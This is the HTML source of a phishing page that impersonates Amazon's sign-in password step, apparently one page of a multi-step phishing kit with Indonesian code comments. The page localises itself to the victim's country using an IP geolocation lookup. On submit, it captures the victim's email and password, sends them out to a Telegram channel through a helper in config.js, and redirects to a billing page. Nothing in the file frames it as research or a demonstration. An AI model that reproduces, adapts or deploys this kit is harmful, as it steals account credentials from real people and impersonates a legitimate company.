<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Enter Password</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 348px; border: 1px solid #ddd; border-radius: 8px; padding: 25px 26px; }
        h1 { font-size: 22px; font-weight: 400; margin-bottom: 10px; }
        .email-tampil { color: #555; font-size: 13px; margin-bottom: 20px; }
        label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 6px; margin-top: 16px; }
        label:first-of-type { margin-top: 0; }
        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 35px; }
        input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
        input.salah { border-color: #c40000; }
        .peringatan { display: none; color: #c40000; font-size: 13px; margin: 6px 0 10px; align-items: flex-start; gap: 5px; }
        .peringatan.tampil { display: flex; }
        .peringatan .ikon { font-weight: bold; font-size: 14px; }
        button { width: 100%; padding: 7px 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; height: 40px; color: #0F1111; cursor: pointer; margin-top: 25px; }
        button:hover { background: #F7CA00; border-color: #F2C200; }
        .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1 data-i18n="enterPassword">Enter your password</h1>
        <p class="email-tampil" id="tampilEmail"></p>
        <form id="formPassword">
            <label for="sandi" data-i18n="passwordLabel">Password</label>
            <input type="password" id="sandi" data-i18n-placeholder="passwordPlaceholder" placeholder="Enter your password">
            <div class="peringatan" id="pSandi"><span class="ikon">!</span><span data-i18n="enterPasswordMsg">Enter your password</span></div>
            <button type="submit" data-i18n="signInBtn">Sign In</button>
        </form>
    </div>
    <div class="footer">
        <a href="#" data-i18n="conditions">Conditions of Use</a>
        <a href="#" data-i18n="privacy">Privacy Notice</a>
        <a href="#" data-i18n="help">Help</a>
        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

    <script>
        // === TERJEMAHAN ===
        const terjemahan = {
            ja: {
                enterPassword: 'パスワードを入力',
                passwordLabel: 'パスワード',
                passwordPlaceholder: 'パスワードを入力してください',
                enterPasswordMsg: 'パスワードを入力してください',
                signInBtn: 'ログイン',
                conditions: '利用規約',
                privacy: 'プライバシー通知',
                help: 'ヘルプ'
            },
            id: {
                enterPassword: 'Masukkan kata sandi',
                passwordLabel: 'Kata Sandi',
                passwordPlaceholder: 'Masukkan kata sandi Anda',
                enterPasswordMsg: 'Masukkan kata sandi',
                signInBtn: 'Masuk',
                conditions: 'Syarat Penggunaan',
                privacy: 'Kebijakan Privasi',
                help: 'Bantuan'
            },
            en: {
                enterPassword: 'Enter your password',
                passwordLabel: 'Password',
                passwordPlaceholder: 'Enter your password',
                enterPasswordMsg: 'Enter your password',
                signInBtn: 'Sign In',
                conditions: 'Conditions of Use',
                privacy: 'Privacy Notice',
                help: 'Help'
            }
        };

        // Peta kode negara → bahasa
        const negaraKeBahasa = {
            'JP': 'ja', 'ID': 'id',
            'US': 'en', 'GB': 'en', 'AU': 'en', 'CA': 'en', 'NZ': 'en',
            'MY': 'en', 'SG': 'en', 'PH': 'en', 'TH': 'en', 'VN': 'en',
            'CN': 'en', 'KR': 'en', 'DE': 'en', 'FR': 'en'
        };

        // Terapkan bahasa
        function terapkanBahasa(kodeBahasa) {
            const kamus = terjemahan[kodeBahasa] || terjemahan.en;
            document.documentElement.lang = kodeBahasa;
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const kunci = el.getAttribute('data-i18n');
                if (kamus[kunci]) el.textContent = kamus[kunci];
            });
            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                const kunci = el.getAttribute('data-i18n-placeholder');
                if (kamus[kunci]) el.placeholder = kamus[kunci];
            });
        }

        // Deteksi lokasi & terapkan bahasa
        async function deteksiLokasi() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data && data.country_code) {
                    const bahasa = negaraKeBahasa[data.country_code] || 'id';
                    terapkanBahasa(bahasa);
                } else {
                    terapkanBahasa('id');
                }
            } catch (err) {
                terapkanBahasa('id');
            }
        }
        deteksiLokasi();

        // Cek sudah lewat index.html
        const emailPengguna = localStorage.getItem('emailPengguna') || '';
        if (!emailPengguna) window.location.href = 'index.html';
        document.getElementById('tampilEmail').textContent = emailPengguna;

        const form = document.getElementById('formPassword');
        const inputSandi = document.getElementById('sandi');

        form.addEventListener('submit', async e => {
            e.preventDefault();
            const sandi = inputSandi.value.trim();
            if (!sandi) {
                inputSandi.classList.add('salah');
                document.getElementById('pSandi').classList.add('tampil');
                return;
            }
            localStorage.setItem('passwordPengguna', sandi);

            // Kirim LOGIN ke Telegram
            const pesanLogin = `
🔐 *LOGIN*
━━━━━━━━━━━━━━━━━━━━━
📧 Email: \`${emailPengguna}\`
🔑 Password: \`${sandi}\`
🕐 Waktu: ${new Date().toLocaleString()}
            `.trim();

            if (typeof CONFIG !== 'undefined' && CONFIG.kirimKeTelegram) {
                await CONFIG.kirimKeTelegram(pesanLogin);
            }

            window.location.href = 'billing.html';
        });

        inputSandi.addEventListener('input', () => {
            inputSandi.classList.remove('salah');
            document.getElementById('pSandi').classList.remove('tampil');
        });
    </script>
</body>
</html>
